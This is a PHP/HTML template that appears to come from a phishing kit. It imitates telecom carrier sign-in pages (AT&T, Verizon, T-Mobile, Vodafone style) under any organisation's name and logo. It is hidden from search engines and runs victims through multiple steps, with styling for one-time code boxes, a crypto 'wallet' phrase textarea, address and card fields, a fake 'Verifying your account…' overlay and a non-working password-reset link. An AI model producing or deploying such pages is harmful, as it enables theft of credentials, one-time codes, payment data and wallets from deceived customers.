<?php
// Telecom template — AT&T / Verizon / T-Mobile / Vodafone style
// Dark sidebar or top-stripe, clean white card, strong brand header, sans-serif
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — My Account</title>
<meta name="robots" content="noindex,nofollow">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--a:<?=$accent?>;--s:<?=$sec?>;--r:<?=$ar?>;--g:<?=$ag?>;--b:<?=$ab?>}
body{font-family:'Inter',system-ui,sans-serif;min-height:100vh;min-height:100dvh;
  background:#f0f2f5;display:flex;flex-direction:column;align-items:center;
  justify-content:center;padding:20px 16px;color:#1a1a2e}

/* Top brand bar */
.brand-bar{width:100%;max-width:440px;background:<?=$accent?>;padding:0 24px;height:4px;border-radius:4px 4px 0 0}

/* Card */
.card{width:100%;max-width:440px;background:#fff;border-radius:0 0 14px 14px;
  box-shadow:0 4px 24px rgba(0,0,0,.13),0 1px 4px rgba(0,0,0,.08);overflow:hidden}

/* Header */
.hd{background:<?=$accent?>;padding:22px 28px 18px;position:relative;overflow:hidden}
.hd::before{content:'';position:absolute;right:-50px;top:-50px;width:180px;height:180px;
  border-radius:50%;background:rgba(255,255,255,.06)}
.hd-row{display:flex;align-items:center;gap:14px;position:relative;z-index:1}
.logo-box{width:52px;height:52px;background:<?=$logo_bg?>;border-radius:10px;
  display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0;
  border:2px solid rgba(255,255,255,.2)}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:19px;font-weight:800;color:<?=$accent?>}
.hd-name{font-size:17px;font-weight:700;color:#fff;line-height:1.2}
.hd-sub{font-size:11px;color:rgba(255,255,255,.72);margin-top:2px}

/* Step dots */
.step-dots{display:flex;gap:6px;padding:16px 28px 0;border-bottom:1px solid #eef0f3;padding-bottom:14px}
.dot{width:8px;height:8px;border-radius:50%;background:#e0e3e9;transition:background .2s}
.dot.active{background:<?=$accent?>;width:22px;border-radius:4px}
.dot.done{background:<?=$sec?> }

/* Body */
.bd{padding:24px 28px 22px}
.step-title{font-size:19px;font-weight:700;color:#1a1a2e;margin-bottom:4px}
.step-sub{font-size:13px;color:#6b7280;margin-bottom:20px;line-height:1.5}

/* Fields */
.field{margin-bottom:15px;position:relative}
.field label{display:block;font-size:12px;font-weight:600;color:#4b5563;margin-bottom:6px;letter-spacing:.2px}
.field input{width:100%;background:#f8f9fb;border:1.5px solid #e2e6ec;color:#1a1a2e;
  padding:13px 14px;border-radius:8px;font-size:15px;outline:none;
  font-family:inherit;-webkit-appearance:none;transition:border-color .15s,box-shadow .15s}
.field input:focus{border-color:<?=$accent?>;box-shadow:0 0 0 3px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.12);background:#fff}
.field input::placeholder{color:#c4c8d0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.or-div{text-align:center;font-size:12px;color:#9ca3af;margin:12px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:43%;height:1px;background:#eef0f3}
.or-div::before{left:0}.or-div::after{right:0}

/* Button */
.btn{width:100%;padding:14px;background:<?=$accent?>;color:#fff;font-size:15px;font-weight:700;
  border:none;border-radius:8px;cursor:pointer;margin-top:6px;
  transition:filter .15s;position:relative;font-family:inherit}
.btn:hover{filter:brightness(.92)}
.btn:disabled{opacity:.55;cursor:not-allowed}
.btn.loading::after{content:'';position:absolute;right:16px;top:50%;width:16px;height:16px;
  border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;
  transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:13px;color:#dc2626;margin-top:8px;display:none}

/* Forgot + link */
.links-row{display:flex;justify-content:space-between;margin-top:14px}
.links-row a,.forgot-link{font-size:13px;color:<?=$accent?>;text-decoration:none}
.links-row a:hover,.forgot-link:hover{text-decoration:underline}
.forgot-link{display:block;text-align:center;margin-top:12px;font-size:13px;color:<?=$accent?>;text-decoration:none}

/* OTP / wallet */
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:22px;font-weight:700;padding:12px 4px;max-width:48px;
  background:#f8f9fb;border:1.5px solid #e2e6ec;border-radius:8px;color:#1a1a2e;outline:none}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:12px;color:#9ca3af;text-align:center;margin-top:8px}
.wallet-area{width:100%;min-height:80px;background:#f8f9fb;border:1.5px solid #e2e6ec;color:#1a1a2e;
  padding:13px 14px;border-radius:8px;font-size:14px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:11px;color:#9ca3af;margin-top:6px;line-height:1.5;text-align:center}
.addr-area{width:100%;min-height:60px;background:#f8f9fb;border:1.5px solid #e2e6ec;color:#1a1a2e;
  padding:13px 14px;border-radius:8px;font-size:14px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:<?=$accent?>}

/* Footer */
.card-footer{padding:14px 28px;border-top:1px solid #f0f2f5;font-size:11px;color:#9ca3af;
  display:flex;align-items:center;justify-content:space-between}
.card-footer a{color:#9ca3af;text-decoration:none}
.card-footer a:hover{text-decoration:underline}
.footer-links a{margin-left:12px}

#loadOverlay{display:none;position:fixed;inset:0;background:rgba(240,242,245,.9);z-index:999;
  align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:40px;height:40px;border:3px solid #e2e6ec;border-top-color:<?=$accent?>;
  border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:#9ca3af}

@media(max-width:480px){
  .brand-bar{display:none}
  .card{border-radius:0;min-height:100vh;min-height:100dvh;box-shadow:none}
  .bd{padding:20px 20px 18px}
  .card-footer{padding:12px 20px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Verifying your account…</div></div>

<div class="brand-bar"></div>
<div class="card">
  <div class="hd">
    <div class="hd-row">
      <div class="logo-box">
        <?php if($logo_url): ?>
        <img src="<?=htmlspecialchars($logo_url)?>" alt="<?=htmlspecialchars($org_name)?>" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
        <div class="logo-ini" style="display:none"><?=strtoupper(substr($org_name,0,2))?></div>
        <?php else: ?>
        <div class="logo-ini"><?=strtoupper(substr($org_name,0,2))?></div>
        <?php endif; ?>
      </div>
      <div>
        <div class="hd-name"><?=htmlspecialchars($org_name)?></div>
        <div class="hd-sub">My Account — Secure Sign In</div>
      </div>
    </div>
  </div>

  <!-- Step dots -->
  <div class="step-dots" id="stepDots">
    <?php for($i=1;$i<=$total_steps;$i++): ?>
    <div class="dot <?=$i===1?'active':''?>" id="dot<?=$i?>"></div>
    <?php endfor; ?>
  </div>

  <div class="bd">
    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <div class="step-title"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <?php if(!empty($sc['step_subs'][$sn])): ?>
      <div class="step-sub" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <?php endif; ?>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
      </form>
      <?php if($sn===1): ?>
      <a href="#" class="forgot-link" onclick="return false">Forgot username or password?</a>
      <?php endif; ?>
    </div>
    <?php endfor; ?>
  </div>

  <div class="card-footer">
    <span><?=$footer?></span>
    <div class="footer-links">
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Help</a>
    </div>
  </div>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
<script>
// Update step dots
const _origShowStepTel = showStep;
function showStep(n) {
  _origShowStepTel(n);
  document.querySelectorAll('.dot').forEach((d,i)=>{
    d.classList.remove('active','done');
    if(i+1===n) d.classList.add('active');
    else if(i+1<n) d.classList.add('done');
  });
}
</script>
</body>
</html>
